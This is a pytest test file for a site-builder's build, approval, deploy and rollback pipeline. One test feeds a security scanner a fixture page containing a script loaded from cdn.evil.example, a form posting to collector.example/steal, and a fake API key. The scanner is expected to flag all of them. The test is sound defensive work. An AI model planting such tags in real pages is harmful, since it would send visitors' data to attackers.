"""Build, gates, approval binding, deploy, idempotency, rollback (roadmap phases 4–7)."""
from pathlib import Path

from conftest import User, answer, approve_and_deploy, complete_onboarding, new_project, to_preview


def _project_with_preview(client, email="a@example.com"):
    u = User(client, email)
    pid = new_project(u)["id"]
    complete_onboarding(u, pid)
    return u, pid, to_preview(u, pid)


def test_build_is_reproducible_and_passes_gates(client):
    u, pid, b = _project_with_preview(client)
    assert b["status"] == "passed", (b["test_report"], b["security_report"])
    assert b["test_report"]["passed"] and b["security_report"]["passed"]
    assert {"index.html", "contact.html", "privacy.html", "thanks.html"} <= set(b["pages"])
    html = u.get(f"/preview/{b['id']}/index.html").text
    assert "owner@sharma.example" not in html  # notification email stays server-side
    assert "Content-Security-Policy" in html
    # rebuilding the same approved plan gives a byte-identical artifact
    r = u.post(f"/api/projects/{pid}/builds")
    b2 = u.get(f"/api/projects/{pid}/builds").json()[0]
    assert b2["number"] == 2 and b2["checksum"] == b["checksum"]


def test_cannot_build_before_scope_approval(client):
    u = User(client, "a@example.com")
    pid = new_project(u)["id"]
    complete_onboarding(u, pid)
    assert u.post(f"/api/projects/{pid}/builds").status_code == 409


def test_scope_approval_bound_to_hash(client):
    u = User(client, "a@example.com")
    pid = new_project(u)["id"]
    complete_onboarding(u, pid)
    r = u.post(f"/api/projects/{pid}/blueprint/decision", json={"content_hash": "0" * 64})
    assert r.status_code == 409


def test_release_requires_approval_of_exact_checksum(client):
    u, pid, b = _project_with_preview(client)
    r = u.post(f"/api/projects/{pid}/deployments", json={"build_id": b["id"], "idempotency_key": "k" * 12, "password": u.password})
    assert r.status_code in (403, 409)
    r = u.post(f"/api/projects/{pid}/builds/{b['id']}/decision", json={"checksum": "f" * 64, "decision": "approved"})
    assert r.status_code == 409


def test_tampered_artifact_is_not_deployed(client):
    u, pid, b = _project_with_preview(client)
    u.post(f"/api/projects/{pid}/builds/{b['id']}/decision", json={"checksum": b["checksum"], "decision": "approved"})
    from app import db
    from app.models import Build
    s = db.SessionLocal()
    path = Path(s.get(Build, b["id"]).artifact_path)
    s.close()
    (path / "index.html").write_text((path / "index.html").read_text() + "<!-- injected -->")
    r = u.post(f"/api/projects/{pid}/deployments", json={"build_id": b["id"], "idempotency_key": "k" * 12, "password": u.password})
    assert r.status_code == 403 and "checksum" in r.json()["detail"]


def test_deploy_is_idempotent_and_serves_live(client):
    u, pid, b = _project_with_preview(client)
    d1 = approve_and_deploy(u, pid, b, key="same-key-123")
    assert d1["status"] == "live" and d1["health"]["healthy"]
    r = u.post(f"/api/projects/{pid}/deployments", json={"build_id": b["id"], "idempotency_key": "same-key-123", "password": u.password})
    assert r.json()["id"] == d1["id"]
    slug = u.get(f"/api/projects/{pid}").json()["project"]["slug"]
    page = client.get(f"/sites/{slug}/")
    assert page.status_code == 200 and "Sharma Plumbing" in page.text


def test_failed_health_check_rolls_back_automatically(client, monkeypatch):
    u, pid, b = _project_with_preview(client)
    approve_and_deploy(u, pid, b, key="first-release")
    # second release with a changed plan
    answer(u, pid, "business_name", value="Sharma & Sons")
    st = u.get(f"/api/projects/{pid}").json()
    u.post(f"/api/projects/{pid}/blueprint/decision", json={"content_hash": st["blueprint"]["content_hash"]})
    u.post(f"/api/projects/{pid}/builds")
    b2 = u.get(f"/api/projects/{pid}/builds").json()[0]
    u.post(f"/api/projects/{pid}/builds/{b2['id']}/decision", json={"checksum": b2["checksum"], "decision": "approved"})
    from app.services import release
    monkeypatch.setattr(release.hosting, "health_check", lambda *a, **k: {"healthy": False, "checks": [{"check": "page-index.html", "passed": False}]})
    r = u.post(f"/api/projects/{pid}/deployments", json={"build_id": b2["id"], "idempotency_key": "second-release", "password": u.password})
    assert r.json()["status"] == "rolled_back"
    monkeypatch.undo()
    slug = st["project"]["slug"]
    assert "Sharma Plumbing" in client.get(f"/sites/{slug}/").text  # previous version still live
    assert "Sharma &amp; Sons" not in client.get(f"/sites/{slug}/").text


def test_manual_rollback(client):
    u, pid, b = _project_with_preview(client)
    approve_and_deploy(u, pid, b, key="first-release")
    answer(u, pid, "business_name", value="Sharma & Sons")
    st = u.get(f"/api/projects/{pid}").json()
    u.post(f"/api/projects/{pid}/blueprint/decision", json={"content_hash": st["blueprint"]["content_hash"]})
    u.post(f"/api/projects/{pid}/builds")
    b2 = u.get(f"/api/projects/{pid}/builds").json()[0]
    approve_and_deploy(u, pid, b2, key="second-release")
    slug = st["project"]["slug"]
    assert "Sharma &amp; Sons" in client.get(f"/sites/{slug}/").text
    r = u.post(f"/api/projects/{pid}/deployments/rollback", json={"password": u.password})
    assert r.status_code == 200
    assert "Sharma &amp; Sons" not in client.get(f"/sites/{slug}/").text
    actions = [a["action"] for a in u.get(f"/api/projects/{pid}/audit").json()]
    assert "deploy.rollback" in actions and "deploy.live" in actions and "release.approved" in actions


def test_security_scan_blocks_bad_artifacts(tmp_path):
    from app.agents.security_privacy import review_artifact
    (tmp_path / "index.html").write_text(
        '<html><head><meta http-equiv="Content-Security-Policy" content="x"></head><body>'
        '<script src="https://cdn.evil.example/x.js"></script>'
        '<form action="https://collector.example/steal" method="post"></form>'
        '<p>api_key = "abcdefghijklmnopqrstuvwxyz123"</p><p>owner@private.example</p></body></html>')
    rep = review_artifact(tmp_path, ["owner@private.example"])
    ids = {f["id"] for f in rep["findings"]}
    assert not rep["passed"]
    assert {"third-party-script", "form-endpoint", "secret-in-artifact", "private-value-exposed"} <= ids


def test_content_agent_rejects_fabricated_claims():
    from app.agents.design import check_claims
    owner = "We fix leaks in Dehradun"
    flags = check_claims(["Award-winning plumbers with 20+ years and 500 happy customers, 100% guaranteed"], owner)
    kinds = {f["kind"] for f in flags}
    assert {"awards", "years of experience", "customer counts", "guarantees"} <= kinds
    assert not check_claims(["15 years of experience"], "We have 15 years of experience")


def test_delete_project_removes_everything(live_site, client):
    u, p, b, dep = live_site
    assert u.post(f"/api/projects/{p['id']}/delete", json={"password": u.password}).status_code == 200
    assert client.get(f"/sites/{p['slug']}/").status_code == 404
    assert u.get(f"/api/projects/{p['id']}").status_code == 404
